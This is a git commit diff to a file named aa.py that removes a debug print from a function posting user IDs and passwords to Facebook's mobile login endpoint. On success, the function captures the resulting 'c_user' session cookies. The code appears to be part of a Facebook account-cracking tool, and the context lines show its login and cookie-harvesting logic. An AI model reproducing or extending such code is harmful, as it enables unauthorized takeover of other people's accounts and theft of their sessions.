8e169fc48dfb758a4b9c5f25cbf17ff1728511b0
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-12-26 23:28:49 +0530

    Update aa.py

--- aa.py
+++ aa.py
@@ -1890,7 +1890,6 @@ def d(uid,pwx,tl):
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data2, headers=headers).text
-            print(po)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
